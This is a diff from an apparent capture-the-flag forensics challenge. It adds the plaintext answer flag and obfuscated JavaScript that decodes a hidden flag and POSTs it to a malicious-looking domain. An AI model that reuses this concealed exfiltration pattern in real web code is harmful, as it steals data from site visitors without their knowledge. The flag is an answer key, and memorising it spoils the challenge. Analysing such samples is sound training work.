@@ -1,1 +1,194 @@
 LKS{warming_uP_w1th_SIEM_is_real_life_forensic_challenge}
+
+var _0xd4544 = _0x5876;
+(function (_0x329b82, _0x58f246) {
+	var _0x5d9fb6 = _0x5876, _0xb492a7 = _0x329b82();
+	while (!![]) {
+		try {
+			var _0x515a69 = -parseInt(_0x5d9fb6(193)) / 1 + parseInt(_0x5d9fb6(186)) / 2 + -parseInt(_0x5d9fb6(192)) / 3 * (parseInt(_0x5d9fb6(194)) / 4) + parseInt(_0x5d9fb6(187)) / 5 + -parseInt(_0x5d9fb6(191)) / 6 * (parseInt(_0x5d9fb6(197)) / 7) + parseInt(_0x5d9fb6(198)) / 8 * (-parseInt(_0x5d9fb6(200)) / 9) + parseInt(_0x5d9fb6(202)) / 10;
+			if (_0x515a69 === _0x58f246)
+				break;
+			else
+				_0xb492a7['push'](_0xb492a7['shift']());
+		} catch (_0x376d25) {
+			_0xb492a7['push'](_0xb492a7['shift']());
+		}
+	}
+}(_0x4891, 990044));
+function getTime() {
+	var _0x1f9601 = _0x5876;
+	time = new Date()[_0x1f9601(188)](), document[_0x1f9601(189)][_0x1f9601(201)] = time;
+}
+setInterval(getTime, 1000);
+function _0x5876(_0x48aa27, _0x2cc86e) {
+	var _0x4891a0 = _0x4891();
+	return _0x5876 = function (_0x587627, _0x4179b4) {
+		_0x587627 = _0x587627 - 185;
+		var _0x18dab9 = _0x4891a0[_0x587627];
+		return _0x18dab9;
+	}, _0x5876(_0x48aa27, _0x2cc86e);
+}
+var arr = [
+		76,
+		219,
+		248,
+		132,
+		153,
+		233,
+		75,
+		142,
+		148,
+		114,
+		188,
+		54,
+		83,
+		53,
+		62,
+		74,
+		203,
+		89,
+		123,
+		1,
+		3,
+		72,
+		41,
+		98,
+		109,
+		172,
+		51,
+		119,
+		22,
+		214,
+		97,
+		141,
+		224,
+		246,
+		160,
+		208,
+		108,
+		59,
+		16,
+		49,
+		203,
+		131,
+		105,
+		221,
+		58,
+		9,
+		120,
+		33,
+		99,
+		222,
+		119,
+		27,
+		220,
+		176,
+		105,
+		247,
+		18,
+		94,
+		13,
+		46,
+		48,
+		108,
+		1,
+		125,
+		190,
+		139,
+		117,
+		130,
+		87,
+		174,
+		48,
+		29,
+		115,
+		109,
+		75,
+		108,
+		6,
+		203,
+		95,
+		74,
+		38,
+		4,
+		14,
+		41,
+		99,
+		171,
+		33,
+		33,
+		184,
+		189,
+		108,
+		35,
+		86,
+		186,
+		79,
+		168,
+		48,
+		133,
+		42,
+		231,
+		123,
+		239,
+		99,
+		233,
+		0,
+		65,
+		178,
+		124,
+		107,
+		160,
+		117,
+		20,
+		125,
+		83,
+		63,
+		127,
+		101,
+		123,
+		11,
+		174,
+		125,
+		10,
+		214,
+		255,
+		96,
+		4
+	], data = '';
+for (var i = 0; i < arr[_0xd4544(199)]; i++) {
+	i % 6 == 0 && (data += String[_0xd4544(196)](arr[i]));
+}
+var flag = { 'lksflag': data };
+function _0x4891() {
+	var _0x97e270 = [
+		'1377HHmUEw',
+		'1387790mXhqLz',
+		'15540GRdPZX',
+		'then',
+		'fromCharCode',
+		'669529BmbLPl',
+		'664nbMvKY',
+		'length',
+		'71847UZzJrE',
+		'innerHTML',
+		'43069060YPxDpw',
+		'application/json',
+		'1227938xPLJjB',
+		'1426755ojElAW',
+		'toLocaleTimeString',
+		'body',
+		'stringify',
+		'24XpUdzJ'
+	];
+	_0x4891 = function () {
+		return _0x97e270;
+	};
+	return _0x4891();
+}
+fetch('https://malicious-lksn-surabaya-domain.co.id', {
+	'method': 'POST',
+	'headers': { 'Content-Type': _0xd4544(185) },
+	'body': JSON[_0xd4544(190)](flag)
+})[_0xd4544(195)](_0x375525 => {
+});
